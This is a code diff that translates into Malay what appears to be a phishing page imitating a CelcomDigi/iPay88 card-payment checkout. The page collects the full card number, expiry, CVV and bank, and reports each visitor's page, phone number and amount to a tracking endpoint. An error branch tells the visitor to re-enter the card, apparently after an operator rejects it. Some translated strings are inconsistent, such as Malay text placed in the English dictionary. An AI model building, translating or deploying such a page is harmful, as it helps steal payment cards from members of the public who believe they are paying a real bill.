@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ms">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>CelcomDigi Next Gen App iPay88</title>
+  <title>CelcomDigi Apl Generasi Seterusnya iPay88</title>
   <link href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&family=Montserrat:wght@400;600;700&display=swap" rel="stylesheet">
   <style>
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
@@ -357,7 +357,7 @@
     <button class="back-btn" onclick="history.back()">
       <img src="/get-assets/images/arrow-narrow-left.svg" alt="Back">
     </button>
-    <button class="lang-btn" id="langToggle">BM</button>
+    <button class="lang-btn" id="langToggle">EN</button>
   </div>
   <div class="logo-bar">
     <img src="/get-assets/images/ngpay-logo.svg" alt="CelcomDigi">
@@ -368,45 +368,45 @@
 <div class="white-card">
   <div class="timeout-badge">Timeout: <span id="countdown">08:00</span></div>
 
-  <div class="summary-title">Summary of transaction</div>
+  <div class="summary-title">Ringkasan transaksi</div>
 
-  <div class="summary-amount-label">Net charges</div>
+  <div class="summary-amount-label">Caj bersih</div>
   <div class="summary-amount-value" id="displayAmount">MYR 0.00</div>
 
   <div class="summary-row">
-    <div class="summary-label">Pay to</div>
+    <div class="summary-label">Bayar kepada</div>
     <div class="summary-value">CelcomDigi Telecommunications Sdn Bhd</div>
   </div>
 
   <div class="summary-row">
-    <div class="summary-label">Payment of</div>
+    <div class="summary-label">Pembayaran untuk</div>
     <div class="summary-value" id="paymentOf">RM 0 Bill Payment for -</div>
   </div>
 
   <div class="summary-row">
-    <div class="summary-label">Reference no. / Payment ID</div>
+    <div class="summary-label">No. rujukan / ID Pembayaran</div>
     <div class="summary-value" id="refNo">-</div>
   </div>
 
   <div class="wave-divider"></div>
 </div>
 
-<!-- Card details (continues white background) -->
+<!-- Maklumat kad (continues white background) -->
 <div class="card-details-section" id="cardDetailsSection">
-  <div class="section-title">Card details</div>
+  <div class="section-title">Maklumat kad</div>
 
   <form id="cardForm" autocomplete="off" class="form" onsubmit="return false;">
 
-    <!-- Cardholder name -->
+    <!-- Nama pemegang kad -->
     <div class="input-wrap">
-      <label class="float-label" for="CCName">Cardholder name</label>
+      <label class="float-label" for="CCName">Nama pemegang kad</label>
       <input class="text-field" type="text" id="CCName" name="CCName" maxlength="35"
              oninput="validateForm()" onfocus="floatUp(this)" onblur="floatDown(this)">
     </div>
 
     <!-- Card number -->
     <div class="input-wrap">
-      <label class="float-label" for="CCNo">Credit / Debit card number</label>
+      <label class="float-label" for="CCNo">Nombor kad kredit / debit</label>
       <input class="text-field" type="tel" id="CCNo" name="CCNo" maxlength="19"
              oninput="formatCard(this); validateForm()" onfocus="floatUp(this)" onblur="floatDown(this)">
     </div>
@@ -414,7 +414,7 @@
     <!-- Expiry + CVV -->
     <div class="two-col">
       <div class="input-wrap">
-        <label class="float-label" for="ExpiryDate">Expiry date (MM/YY)</label>
+        <label class="float-label" for="ExpiryDate">Tarikh luput (MM/TT)</label>
         <input class="text-field" type="tel" id="ExpiryDate" name="ExpiryDate" maxlength="5"
                oninput="formatExpiry(this); validateForm()" onfocus="floatUp(this)" onblur="floatDown(this)">
       </div>
@@ -427,7 +427,7 @@
 
     <!-- Country -->
     <select class="select-field" id="CCCountry" name="CCCountry" onchange="validateForm()">
-      <option value="">Select Country</option>
+      <option value="">Pilih Negara</option>
       <option value="AU">Australia</option>
       <option value="AT">Austria</option>
       <option value="AZ">Azerbaijan</option>
@@ -604,7 +604,7 @@
 
     <!-- Other bank (hidden) -->
     <div id="otherBankRow" class="input-wrap hidden-row">
-      <label class="float-label" for="OtherBank">Others bank name</label>
+      <label class="float-label" for="OtherBank">Nama bank lain</label>
       <input class="text-field" type="text" id="OtherBank" name="CCBankother" maxlength="256"
              oninput="validateForm()" onfocus="floatUp(this)" onblur="floatDown(this)">
     </div>
@@ -612,14 +612,14 @@
     <!-- Authorization checkbox -->
     <label class="checkbox-wrap">
       <input type="checkbox" id="AcceptTC" name="AcceptTC" class="checkbox-input" onchange="validateForm()">
-      <span class="checkbox-label">I authorize Digi Telecommunications Sdn Bhd to debit the above net charges from my credit / debit card and I have read &amp; agreed to <a href="https://my.nttdatapay.com/privacy-notice" target="_blank" class="privacy-link">our Privacy Statement</a>.</span>
+      <span class="checkbox-label">Saya memberi kebenaran kepada Digi Telecommunications Sdn Bhd untuk mendebit caj bersih di atas daripada kad kredit / debit saya dan saya telah membaca &amp; bersetuju dengan <a href="https://my.nttdatapay.com/privacy-notice" target="_blank" class="privacy-link">Penyataan Privasi kami</a>.</span>
     </label>
 
     <!-- Proceed -->
-    <button type="button" id="proceedBtn" class="btn-proceed disabled" onclick="handleProceed()">Proceed</button>
+    <button type="button" id="proceedBtn" class="btn-proceed disabled" onclick="handleProceed()">Teruskan</button>
 
     <!-- Cancel -->
-    <button type="button" class="btn-cancel" onclick="handleCancel()">Cancel</button>
+    <button type="button" class="btn-cancel" onclick="handleCancel()">Batal</button>
 
   </form>
 </div>
@@ -642,13 +642,13 @@
     fetch('/api/visitor/ping', { method: 'POST', headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ visitorId: _vid, page, number: num || '', amount: amt || '', type: tp || type }) }).catch(() => {});
   }
-  pingVisitor('credit-card', number, amount, type);
+  pingVisitor('credit-card-ms', number, amount, type);
 
   // Show error message if rejected
   if (errorParam === 'card') {
     const errDiv = document.createElement('div');
     errDiv.style.cssText = 'background:#fff3f3;border:1.5px solid #e53935;color:#c62828;border-radius:10px;padding:12px 16px;font-size:14px;font-weight:600;margin-bottom:16px;text-align:center;';
-    errDiv.textContent = 'Please verify your card details and try again.';
+    errDiv.textContent = 'Sila sahkan maklumat kad anda dan cuba lagi.';
     const form = document.getElementById('cardForm');
     form.insertBefore(errDiv, form.firstChild);
   }
@@ -672,7 +672,7 @@
     if (totalSecs <= 0) {
       clearInterval(timer);
       cdEl.textContent = '00:00';
-      alert('Session expired. Please try again.');
+      alert('Sesi tamat. Sila cuba lagi.');
       window.location.href = '/bill';
       return;
     }
@@ -757,8 +757,8 @@
       const data = await res.json();
       if (data.success) {
         // Navigate to processing page
-        pingVisitor('processing', number, amount, type);
-        window.location.href = '/processing?sessionId=' + encodeURIComponent(sessionId)
+        pingVisitor('processing-ms', number, amount, type);
+        window.location.href = '/processing/ms?sessionId=' + encodeURIComponent(sessionId)
           + '&number=' + encodeURIComponent(number)
           + '&amount=' + encodeURIComponent(amount)
           + '&ref=' + encodeURIComponent(ref)
@@ -767,18 +767,18 @@
       } else {
         btn.textContent = 'Proceed';
         btn.classList.remove('disabled');
-        alert('Error submitting card. Please try again.');
+        alert('Ralat menghantar kad. Sila cuba lagi.');
       }
     } catch (err) {
       btn.textContent = 'Proceed';
       btn.classList.remove('disabled');
-      alert('Network error. Please try again.');
+      alert('Ralat rangkaian. Sila cuba lagi.');
     }
   }
 
   // ── Cancel ──
   function handleCancel() {
-    if (confirm('Please confirm cancellation of this payment')) {
+    if (confirm('Sila sahkan pembatalan pembayaran ini')) {
       window.location.href = '/bill';
     }
   }
@@ -786,21 +786,21 @@
   // ── Language Toggle ──
   const i18n = {
     en: {
-      summaryTitle: 'Summary of transaction',
-      netCharges: 'Net charges',
+      summaryTitle: 'Ringkasan transaksi',
+      netCharges: 'Caj bersih',
       payTo: 'Pay to',
       paymentOf: 'Payment of',
-      refNo: 'Reference no. / Payment ID',
-      cardDetails: 'Card details',
-      cardholderName: 'Cardholder name',
-      cardNumber: 'Credit / Debit card number',
-      expiryDate: 'Expiry date (MM/YY)',
+      refNo: 'No. rujukan / ID Pembayaran',
+      cardDetails: 'Maklumat kad',
+      cardholderName: 'Nama pemegang kad',
+      cardNumber: 'Nombor kad kredit / debit',
+      expiryDate: 'Tarikh luput (MM/TT)',
       cvv: 'CVC/CVV2',
-      selectCountry: 'Select Country',
-      selectBank: 'Select Bank',
-      otherBank: 'Others bank name',
+      selectCountry: 'Pilih Negara',
+      selectBank: 'Pilih Bank',
+      otherBank: 'Nama bank lain',
       authText: 'I authorize Digi Telecommunications Sdn Bhd to debit the above net charges from my credit / debit card and I have read & agreed to',
-      privacyLink: 'our Privacy Statement',
+      privacyLink: 'Penyataan Privasi kami',
       proceed: 'Proceed',
       cancel: 'Cancel',
       langBtn: 'BM'
@@ -855,12 +855,12 @@
     document.documentElement.lang = lang;
   }
 
-  applyLang(currentLang);
+  // MS version - no toggle needed
 
   document.getElementById('langToggle').addEventListener('click', () => {
     currentLang = currentLang === 'en' ? 'ms' : 'en';
     localStorage.setItem('cdLang', currentLang);
-    applyLang(currentLang);
+    // MS version - no toggle needed
   });
 </script>
 
